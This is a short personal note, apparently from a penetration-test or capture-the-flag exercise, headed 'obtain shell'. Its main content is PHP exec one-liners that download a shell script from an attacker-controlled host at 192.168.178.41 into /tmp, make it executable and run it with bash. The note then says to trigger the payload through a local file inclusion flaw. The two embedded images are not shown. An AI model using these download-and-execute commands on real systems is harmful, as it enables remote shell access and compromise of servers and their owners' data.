![[Pasted image 20210606170602.png]]

![[Pasted image 20210606170616.png]]

# obtain shell


```php
<?php echo exec("wget 192.168.178.41/shell.sh -O /tmp/shell.sh"); ?>

<?php echo exec("chmod +x /tmp/shell.sh"); ?>

<?php echo exec("ls -la /tmp/shell.sh"); ?>

<?php echo exec("/bin/bash /tmp/shell.sh"); ?>
```

call the shell.php with the LFI



